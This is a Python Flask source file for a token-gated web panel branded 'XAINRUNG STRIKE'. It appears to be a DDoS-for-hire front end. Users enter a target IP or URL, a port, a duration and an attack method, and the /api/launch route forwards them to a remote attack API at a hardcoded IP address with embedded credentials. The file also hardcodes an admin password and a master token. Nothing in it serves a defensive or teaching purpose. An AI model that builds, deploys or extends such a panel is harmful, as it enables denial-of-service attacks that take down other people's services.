from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
import requests
import logging
import secrets
import time

app = Flask(__name__)
app.secret_key = secrets.token_hex(16) # คีย์สำหรับระบบ Session

# เก็บ Token ในหน่วยความจำ (ในใช้งานจริงควรเก็บลงไฟล์หรือ Database)
# รูปแบบ: {"token_value": expiry_timestamp}
valid_tokens = {"ADMIN-XAINRUNG-999": time.time() + 86400} 

# --- WEB INTERFACE (HTML/CSS/JS) ---
HTML_CODE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XAINRUNG NETWORK | GLOBAL STRIKE SYSTEM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { 
            --primary: #9d4edd; 
            --primary-bright: #c77dff;
            --primary-glow: rgba(157, 78, 221, 0.6);
            --dark-bg: #030105; 
        }

        body {
            background-color: var(--dark-bg);
            color: #d1d5db;
            font-family: 'JetBrains Mono', monospace;
            overflow: hidden;
            margin: 0;
            height: 100vh;
        }

        /* พื้นหลังอวกาศ (Starfield) */
        #space-bg {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: -1;
            background: radial-gradient(circle at center, #120521 0%, #030105 100%);
        }
        
        .star {
            position: absolute; background: white; border-radius: 50%;
            opacity: 0.3; animation: move-stars linear infinite;
        }
        @keyframes move-stars { from { transform: translateY(0); } to { transform: translateY(-100vh); } }

        .header-font { font-family: 'Orbitron', sans-serif; }

        /* หน้า Home/Login - ปรับขนาดไหญ่พอดีหน้าจอ */
        .hero-title {
            font-size: clamp(4rem, 12vw, 9rem);
            line-height: 0.85;
            text-shadow: 0 0 40px var(--primary-glow), 0 0 80px var(--primary-glow);
            letter-spacing: -4px;
        }

        .btn-enter {
            border: 2px solid var(--primary);
            background: rgba(157, 78, 221, 0.05);
            color: var(--primary-bright);
            padding: 1.5rem 4rem;
            font-family: 'Orbitron', sans-serif;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 10px;
            position: relative;
            transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            overflow: hidden;
            box-shadow: inset 0 0 20px var(--primary-glow);
            font-size: 1.2rem;
        }
        .btn-enter:hover {
            background: var(--primary);
            color: white;
            box-shadow: 0 0 60px var(--primary-glow);
            transform: scale(1.1);
        }

        /* หน้า GUI การยิง */
        .glass-panel {
            background: rgba(10, 5, 25, 0.8);
            border: 1px solid rgba(157, 78, 221, 0.4);
            backdrop-filter: blur(30px);
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 
                        inset 0 0 30px rgba(157, 78, 221, 0.1);
            position: relative;
        }
        
        .glass-panel::after {
            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary-bright), transparent);
        }

        .cyber-input {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid rgba(157, 78, 221, 0.3);
            box-shadow: inset 0 0 15px rgba(0, 0, 0, 1);
            color: #fff;
            transition: 0.3s;
        }
        .cyber-input:focus {
            border-color: var(--primary-bright);
            box-shadow: 0 0 25px var(--primary-glow);
            outline: none;
        }

        .btn-strike {
            background: linear-gradient(135deg, #7b2cbf, #9d4edd);
            font-family: 'Orbitron', sans-serif;
            font-weight: 900;
            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
            box-shadow: 0 10px 30px var(--primary-glow);
            transition: 0.4s;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .btn-strike:hover {
            filter: brightness(1.3);
            box-shadow: 0 0 50px var(--primary-glow);
            transform: translateY(-3px);
        }

        .ship-bg {
            position: absolute;
            bottom: -10%; left: 50%;
            transform: translateX(-50%);
            width: 90%;
            max-width: 1200px;
            opacity: 0.15;
            filter: grayscale(1) invert(1) drop-shadow(0 0 100px var(--primary));
            pointer-events: none;
            z-index: 0;
            animation: ship-float 10s ease-in-out infinite;
        }
        @keyframes ship-float {
            0%, 100% { transform: translate(-50%, 0) rotate(0deg); }
            50% { transform: translate(-50%, -40px) rotate(1deg); }
        }

        .glow-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 50% 50%, transparent 20%, rgba(10, 2, 20, 0.9) 100%);
            pointer-events: none;
        }

        .home-menu {
            position: absolute;
            top: 2rem;
            right: 2rem;
            z-index: 100;
        }
        .btn-home {
            background: rgba(157, 78, 221, 0.1);
            border: 1px solid var(--primary);
            color: var(--primary-bright);
            padding: 0.75rem 1.5rem;
            font-family: 'Orbitron', sans-serif;
            font-size: 12px;
            font-weight: bold;
            letter-spacing: 2px;
            transition: 0.3s;
            backdrop-filter: blur(10px);
        }
        .btn-home:hover {
            background: var(--primary);
            color: white;
            box-shadow: 0 0 20px var(--primary-glow);
        }

        .page { transition: 1s cubic-bezier(0.19, 1, 0.22, 1); }
        .hidden { display: none !important; opacity: 0; transform: scale(1.1); }
        
        /* สไตล์พิเศษสำหรับหน้า Login */
        .login-box {
            max-width: 500px;
            width: 90%;
            padding: 3rem;
            border-radius: 20px;
            border: 1px solid rgba(157, 78, 221, 0.5);
            background: rgba(10, 5, 20, 0.9);
            backdrop-filter: blur(20px);
            box-shadow: 0 0 50px rgba(157, 78, 221, 0.2);
        }
    </style>
</head>
<body>
    <div id="space-bg"></div>
    <div class="glow-overlay"></div>

    <section id="login-page" class="page min-h-screen flex flex-col items-center justify-center p-6 text-center">
        <div class="login-box relative z-10">
            <h2 class="header-font text-2xl font-black text-purple-500 mb-2 tracking-tighter uppercase italic">Secure Access</h2>
            <p class="text-[10px] text-zinc-500 mb-8 tracking-[0.3em] uppercase">Enter Authorization Token</p>
            
            <div class="space-y-6">
                <input type="password" id="token-input" placeholder="XR-XXXX-XXXX-XXXX" 
                       class="cyber-input w-full p-4 rounded-lg text-center tracking-[0.5em] font-bold text-purple-300">
                <button onclick="verifyToken()" class="btn-strike w-full py-4 rounded-xl text-white font-black tracking-widest">
                    VERIFY IDENTITY
                </button>
                <p id="login-error" class="text-red-500 text-[10px] font-bold uppercase mt-4 hidden">!! Invalid or Expired Token !!</p>
            </div>
        </div>
        <div class="mt-12 text-purple-900 font-black text-[10px] uppercase tracking-[0.5em] opacity-30">
            XAINRUNG NETWORK | ENCRYPTED GATEWAY
        </div>
    </section>

    <section id="home-page" class="page hidden min-h-screen flex flex-col items-center justify-center p-6 text-center">
        <div class="relative z-10">
            <p class="header-font text-purple-400 tracking-[2em] text-[12px] mb-8 font-black opacity-80">STRIKE SYSTEM ONLINE</p>
            <h1 class="hero-title header-font font-black text-white italic uppercase">
                XAINRUNG<br><span class="text-purple-600">STRIKE</span>
            </h1>
            <div class="mt-16">
                <button onclick="showPage('console')" class="btn-enter">
                    INITIATE ACCESS
                </button>
            </div>
            <div class="mt-32 grid grid-cols-3 gap-12 text-purple-900 font-black text-[11px] uppercase tracking-[0.4em] opacity-40">
                <div>// NODE_X1</div>
                <div>// 84.21.173.208</div>
                <div>// ENCRYPTED</div>
            </div>
        </div>
    </section>

    <section id="console-page" class="page hidden min-h-screen p-8 md:p-16">
        <div class="home-menu">
            <button onclick="showPage('home')" class="btn-home uppercase">
                Return to Hub
            </button>
        </div>

        <img src="https://www.pngall.com/wp-content/uploads/5/Spaceship-PNG-Free-Download.png" class="ship-bg">
        
        <div class="max-w-[1600px] mx-auto relative z-10 h-full flex flex-col">
            <header class="flex justify-between items-end mb-16">
                <div>
                    <h2 class="header-font text-5xl font-black text-white italic tracking-tighter">
                        CORE.<span class="text-purple-600">TERMINAL</span>
                    </h2>
                    <div class="h-1.5 w-32 bg-purple-600 mt-4 shadow-[0_0_15px_#9d4edd]"></div>
                </div>
                <div class="text-right hidden md:block">
                    <p class="text-[10px] text-zinc-500 tracking-[0.5em] uppercase font-bold">System Status</p>
                    <p class="text-green-500 font-bold text-xs uppercase animate-pulse">● Connected to Nebula</p>
                </div>
            </header>

            <div class="grid grid-cols-12 gap-12 flex-grow">
                <div class="col-span-12 lg:col-span-4 space-y-8">
                    <div class="glass-panel p-10 rounded-2xl border-r-8 border-r-purple-600">
                        <h3 class="header-font text-md mb-10 text-purple-400 font-black tracking-[0.3em] uppercase italic border-b border-purple-900 pb-6">Target Configuration</h3>
                        <div class="space-y-8">
                            <div>
                                <label class="text-[10px] text-zinc-400 block mb-3 tracking-widest uppercase font-bold">Target IP / URL</label>
                                <input id="host" type="text" placeholder="0.0.0.0" class="cyber-input w-full p-5 rounded-lg text-lg font-bold">
                            </div>
                            <div class="grid grid-cols-2 gap-6">
                                <div>
                                    <label class="text-[10px] text-zinc-400 block mb-3 tracking-widest uppercase font-bold">Port</label>
                                    <input id="port" type="text" placeholder="80" class="cyber-input w-full p-5 rounded-lg text-lg">
                                </div>
                                <div>
                                    <label class="text-[10px] text-zinc-400 block mb-3 tracking-widest uppercase font-bold">Time</label>
                                    <input id="time" type="text" placeholder="60" class="cyber-input w-full p-5 rounded-lg text-lg">
                                </div>
                            </div>
                            <div>
                                <label class="text-[10px] text-zinc-400 block mb-3 tracking-widest uppercase font-bold">Attack Method</label>
                                <input id="method" type="text" placeholder="GUDP" class="cyber-input w-full p-5 rounded-lg text-lg uppercase font-black">
                            </div>
                            <button onclick="executeAttack()" class="btn-strike w-full py-7 rounded-xl text-white text-lg tracking-[0.3em]">
                                Launch Attack
                            </button>
                        </div>
                    </div>
                </div>

                <div class="col-span-12 lg:col-span-8">
                    <div class="glass-panel h-[650px] rounded-2xl flex flex-col overflow-hidden">
                        <div class="p-6 bg-purple-950/40 flex justify-between items-center px-10 border-b border-purple-900/50">
                            <span class="header-font text-[11px] font-black text-purple-300 tracking-[0.4em] uppercase">Quantum Payload Traffic</span>
                            <div class="flex gap-3">
                                <span class="w-3 h-3 rounded-full bg-purple-500 shadow-[0_0_10px_#9d4edd]"></span>
                            </div>
                        </div>
                        <div id="terminal" class="p-10 font-mono text-[14px] overflow-y-auto space-y-3 flex-grow text-zinc-400">
                            <p class="text-purple-500 font-black">> [SYS] BOOT_SEQUENCE_COMPLETE</p>
                            <p class="text-zinc-600">> [SYS] AWAITING_AUTHORIZATION_KEY...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script>
        // Starfield Generator
        const bg = document.getElementById('space-bg');
        for (let i = 0; i < 200; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            const size = Math.random() * 2.5 + 1;
            star.style.width = size + 'px';
            star.style.height = size + 'px';
            star.style.left = Math.random() * 100 + '%';
            star.style.top = Math.random() * 100 + '%';
            star.style.animationDuration = (Math.random() * 5 + 5) + 's';
            star.style.opacity = Math.random();
            bg.appendChild(star);
        }

        async function verifyToken() {
            const token = document.getElementById('token-input').value;
            const res = await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ token })
            });
            const data = await res.json();
            if(data.status === 'success') {
                showPage('home');
            } else {
                const err = document.getElementById('login-error');
                err.classList.remove('hidden');
                setTimeout(() => err.classList.add('hidden'), 3000);
            }
        }

        function showPage(page) {
            document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
            document.getElementById(`${page}-page`).classList.remove('hidden');
        }

        function addLog(msg, type = 'info') {
            const term = document.getElementById('terminal');
            const p = document.createElement('p');
            let color = "text-zinc-400";
            if(type === 'error') color = "text-red-500 font-black shadow-sm";
            if(type === 'success') color = "text-purple-400 font-black";
            p.className = color;
            p.innerHTML = `<span class="opacity-30 text-[11px]">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
            term.appendChild(p);
            term.scrollTop = term.scrollHeight;
        }

        async function executeAttack() {
            const target = document.getElementById('host').value;
            const port = document.getElementById('port').value;
            const time = document.getElementById('time').value;
            const method = document.getElementById('method').value;
            if(!target || !port) return addLog('!! ERROR: TARGET_DATA_MISSING !!', 'error');
            addLog(`> INJECTING STRIKE SEQUENCE TO: ${target}`, 'info');
            try {
                const response = await fetch('/api/launch', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target, port, time, method })
                });
                const data = await response.json();
                if(data.status === 'success') {
                    addLog(`> RESPONSE: ${data.message} - ATTACK_LIVE`, 'success');
                } else {
                    addLog(`> ALERT: SERVER_REJECTED (${data.message})`, 'error');
                }
            } catch (err) {
                addLog(`> FATAL: QUANTUM_LINK_FAIL`, 'error');
            }
        }

        // ตรวจสอบ Session เมื่อโหลดหน้าเว็บ
        window.onload = async () => {
            const res = await fetch('/api/check_session');
            const data = await res.json();
            if(data.logged_in) showPage('home');
        };
    </script>
</body>
</html>
"""

# --- TOKEN ADMIN PAGE (HTML) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>TOKEN GENERATOR</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
    <style>body{background:#05000a;color:#c77dff;font-family:'Orbitron',sans-serif;}</style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="p-10 bg-black border-2 border-purple-500 rounded-xl shadow-[0_0_30px_#9d4edd] text-center max-w-lg w-full">
        <h1 class="text-2xl font-bold mb-6 italic">TOKEN_ADMIN_PANEL</h1>
        <form method="POST">
            <input name="pw" type="password" placeholder="Admin Password" class="w-full bg-zinc-900 border border-purple-900 p-4 mb-4 rounded text-center">
            <button class="w-full bg-purple-600 p-4 rounded font-bold hover:bg-purple-500 transition">GENERATE NEW TOKEN</button>
        </form>
        {% if token %}
        <div class="mt-8 p-4 bg-purple-950/30 border border-dashed border-purple-400">
            <p class="text-[10px] text-purple-300">NEW_TOKEN_GENERATED:</p>
            <p class="text-xl font-black text-white select-all">{{ token }}</p>
            <p class="text-[8px] text-zinc-500 mt-2">EXPIRES IN: 24 HOURS</p>
        </div>
        {% endif %}
        <a href="/" class="block mt-6 text-[10px] underline">Back to Gateway</a>
    </div>
</body>
</html>
"""

# --- BACKEND LOGIC ---

@app.route('/')
def index():
    return render_template_string(HTML_CODE)

@app.route('/tokenadmin', methods=['GET', 'POST'])
def token_admin():
    new_token = None
    if request.method == 'POST':
        # รหัสผ่านสำหรับสร้าง token (ตั้งไว้เบื้องต้น)
        admin_pw = request.form.get('pw')
        if admin_pw == "XainrungAdmin99": # <--- คุณสามารถเปลี่ยนรหัสตรงนี้ได้
            token_val = f"XR-{secrets.token_hex(4).upper()}-{secrets.token_hex(4).upper()}"
            valid_tokens[token_val] = time.time() + 86400 # หมดอายุใน 24 ชม.
            new_token = token_val
    return render_template_string(ADMIN_HTML, token=new_token)

@app.route('/api/verify', methods=['POST'])
def verify():
    token = request.json.get('token')
    if token in valid_tokens and time.time() < valid_tokens[token]:
        session['logged_in'] = True
        return jsonify({"status": "success"})
    return jsonify({"status": "error"})

@app.route('/api/check_session')
def check_session():
    return jsonify({"logged_in": session.get('logged_in', False)})

@app.route('/api/launch', methods=['POST'])
def launch():
    if not session.get('logged_in'):
        return jsonify({"status": "error", "message": "UNAUTHORIZED_ACCESS"})
        
    data = request.json
    target = data.get('target')
    port = data.get('port')
    time_val = data.get('time')
    method = data.get('method')

    api_url = f"http://84.21.173.208:7575/api/attack?username=Xaingrung&password=Xaingrung&target={target}&port={port}&time={time_val}&method={method}"
    
    try:
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            return jsonify({"status": "success", "message": "STRIKE_CONFIRMED"})
        else:
            return jsonify({"status": "error", "message": f"ERROR_{response.status_code}"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    print("XAINRUNG ADVANCED PANEL WITH TOKEN SYSTEM IS STARTING...")
    app.run(host='0.0.0.0', port=5000, debug=True)
